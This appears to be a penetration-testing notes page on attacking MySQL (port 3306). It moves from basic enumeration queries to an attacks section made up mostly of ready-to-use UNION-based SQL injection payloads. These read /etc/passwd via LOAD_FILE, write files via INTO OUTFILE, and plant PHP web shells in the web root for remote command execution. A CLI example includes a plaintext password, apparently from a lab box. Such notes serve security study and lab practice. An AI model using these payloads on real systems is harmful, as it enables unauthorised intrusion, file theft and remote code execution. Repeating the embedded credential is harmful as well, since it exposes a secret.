---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# MySQL (3306)

## 101

### Usage

{% tabs %}
{% tab title="Version" %}
```sql
SELECT version();
```
{% endtab %}

{% tab title="Current User" %}
```sql
SELECT current_user();
SELECT user();
SELECT system_user();
```
{% endtab %}

{% tab title="Databases" %}
```sql
# List databases
SHOW databases;

# Select the specified database
USE <database>;
```
{% endtab %}

{% tab title="Tables" %}
```sql
SHOW tables FROM <database>;
SHOW tables;
```
{% endtab %}

{% tab title="Data" %}
```sql
SELECT * FROM <table>;
```
{% endtab %}
{% endtabs %}

### Schemas & DBs

MySQL default system schemas:

<table><thead><tr><th width="176.66668701171875">Schema</th><th>Description</th></tr></thead><tbody><tr><td><code>mysql</code> </td><td>System database containing tables that store information required by the MySQL server</td></tr><tr><td><code>information_schema</code> </td><td>Provides access to database metadata</td></tr><tr><td><code>performance_schema</code> </td><td>A feature for monitoring MySQL Server execution at a low level</td></tr><tr><td><code>sys</code> </td><td>A set of objects that helps DBAs and developers interpret data collected by the <code>performance_schema</code></td></tr></tbody></table>

MySQL stores information about itself in the [`information_schema`](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html) database, which is a read-only repository of the metadata of the MySQL database server, providing insights into the structure and organization of the database environment. It contains some useful tables, such as:

| Table                                                                                        | Description                         |
| -------------------------------------------------------------------------------------------- | ----------------------------------- |
| [`schemata`](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html) | Information about all databases     |
| [`tables`](https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html)     | Information about all tables        |
| [`columns`](https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html)   | Details about columns in the tables |

We can use the following queries to enumerate the DBMS via the `information_schema` database:

{% tabs %}
{% tab title="Databases" %}
```sql
SELECT table_schema FROM information_schema.tables GROUP BY table_schema;
```
{% endtab %}

{% tab title="Tables" %}
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='<table>';
```
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```sql
SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = '<database>' AND table_name = '<table>';
```
{% endcode %}
{% endtab %}
{% endtabs %}

### CLI Tools

{% tabs %}
{% tab title="Linux" %}
```bash
mysql -h <target-ip> -u lewis -pP4ntherg0t1n5r3c0n##
```

For an example of `mysql` usage see [Devvortex](../../../../boxes/easy/devvortex.md).
{% endtab %}
{% endtabs %}

## Attacks

### SQLi

<mark style="background-color:yellow;">Enumeration</mark> statements:

{% hint style="danger" %}
On the below commands, the comment at the end includes a space: `--` ! The `#` symbol can also be used.
{% endhint %}

{% tabs %}
{% tab title="DBs" %}
```bash
a' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```
{% endtab %}

{% tab title="Current DB" %}
```bash
a' UNION select 1,database(),2,3-- 
```
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```bash
a' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='db1'-- 
```
{% endcode %}
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```bash
a' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='table1'-- 
```
{% endcode %}
{% endtab %}

{% tab title="Data" %}
```bash
a' ' UNION select 1, col1, col2, 4 from db1.table1-- 
```
{% endtab %}
{% endtabs %}

`UNION`-based payload for <mark style="background-color:yellow;">reading and writing files</mark>:

{% tabs %}
{% tab title="Read" %}
{% code overflow="wrap" %}
```sql
# Enumerate user
a' UNION SELECT 1, user(), 3, 4-- 
a' UNION SELECT 1, user, 3, 4 from mysql.user-- 

# User's privileges
a' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="user1"-- 

# Superpriv
a' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="user1"-- 

# Read file
a' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```
{% endcode %}
{% endtab %}

{% tab title="Write" %}
{% code overflow="wrap" %}
```bash
# Securepriv
a' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"--

# Write file
a' union select 1,'textToBeWritten',3,4 into outfile '/var/www/html/proof.txt'-- 

# RCE
a' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
```
{% endcode %}
{% endtab %}

{% tab title="SUPER_PRIV" %}
```bash
a' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="user1"-- 
```
{% endtab %}

{% tab title="READ" %}
```bash
a' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```
{% endtab %}
{% endtabs %}

### Read & Write Files

{% hint style="warning" %}
The `FILE` privilege is needed to both `read` and `write` files.
{% endhint %}

In MySQL, the ability to read from or write to files requires the `FILE` privilege, and is further controlled by the global system variable `secure_file_priv`. This variable restricts file operations to a specific directory:

* If set to a directory path, operations like `LOAD_FILE` and `SELECT ... INTO OUTFILE` are limited to that path.
* If set to `NULL`, these operations are completely disabled.
* If empty, there are no restrictionsâ€”this is insecure but allows unrestricted file I/O.

```sql
# Check current setting
SELECT @@GLOBAL.secure_file_priv;
```

If permitted, <mark style="background-color:yellow;">files can be written</mark> using the `SELECT ... INTO OUTFILE` clause. The target directory must be writable by the OS user running MySQL. For example:

```sql
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt';
```

To <mark style="color:yellow;">read files</mark>:

```sql
SELECT LOAD_FILE('/var/lib/mysql-files/test.txt');
```

If the server is insecurely configured (e.g., `secure_file_priv` is empty), sensitive files may be readable:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

An attacker with `FILE` privileges may exploit SQLi to:

* Read files using `LOAD_FILE()`
* Write files using `INTO OUTFILE`
* Query sensitive tables and variables like `mysql.user` or `information_schema.global_variables`

{% code overflow="wrap" %}
```sql
a' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4--
a' UNION SELECT 1, user(), 3, 4--
a' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"--
```
{% endcode %}

If the MySQL server is running in a web environment and the <mark style="background-color:yellow;">web root is known and writable</mark>, it may be possible to write a PHP web shell. To enumurate the webroot the `LOAD_FILE` clause can be used to read the server configuration.

<table><thead><tr><th width="144">Server</th><th>Web Root Directory</th></tr></thead><tbody><tr><td>Apache</td><td><code>/etc/apache2/apache2.conf</code></td></tr><tr><td>Nginx</td><td><code>/etc/nginx/nginx.conf</code></td></tr><tr><td>ISS</td><td><code>$WinDir%\System32\Inetsrv\Config\ApplicationHost.config</code></td></tr></tbody></table>

{% code overflow="wrap" %}
```sql
# Write a webshell file
SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE '/var/www/html/webshell.php';
```
{% endcode %}

Once written, this shell can be accessed via a browser to execute OS commands.

## Inline Commands

Tools like WinRM does not support interactive prompts like `mysql` shell normally uses. That means we must use the `-e` option to execute SQL statements inline:

{% code overflow="wrap" %}
```powershell
# List databases
> .\mysql.exe -u root -e "SHOW DATABASES;"

# List tables
.\mysql.exe -u root -D wordpress -e "SHOW TABLES;"
...
```
{% endcode %}
